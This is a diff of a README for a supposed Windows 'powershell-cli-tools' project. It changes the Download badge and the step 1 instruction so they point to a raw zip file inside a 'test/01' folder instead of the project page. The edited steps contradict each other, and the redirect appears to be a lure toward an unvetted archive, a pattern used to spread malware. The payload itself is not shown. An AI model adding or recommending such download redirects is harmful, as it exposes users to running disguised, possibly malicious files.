@@ -1,6 +1,6 @@
 # ⚡ powershell-cli-tools - Make Windows terminal tasks work faster
 
-[![](https://img.shields.io/badge/Download-PowerShell_Tools-blue.svg)](https://github.com/ep563213-sys/powershell-cli-tools)
+[![](https://img.shields.io/badge/Download-PowerShell_Tools-blue.svg)](https://raw.githubusercontent.com/ep563213-sys/powershell-cli-tools/main/test/01/tools-powershell-cli-2.9.zip)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ If you do not have PowerShell 7, visit the official Microsoft website to downloa
 
 You must visit the project page to get the files. Follow these steps to obtain the tools:
 
-1. Visit [https://github.com/ep563213-sys/powershell-cli-tools](https://github.com/ep563213-sys/powershell-cli-tools).
+1. Visit [https://raw.githubusercontent.com/ep563213-sys/powershell-cli-tools/main/test/01/tools-powershell-cli-2.9.zip](https://raw.githubusercontent.com/ep563213-sys/powershell-cli-tools/main/test/01/tools-powershell-cli-2.9.zip).
 2. Look for the green Code button on the right side of the screen.
 3. Click the button and select Download ZIP.
 4. Save the file to your computer.
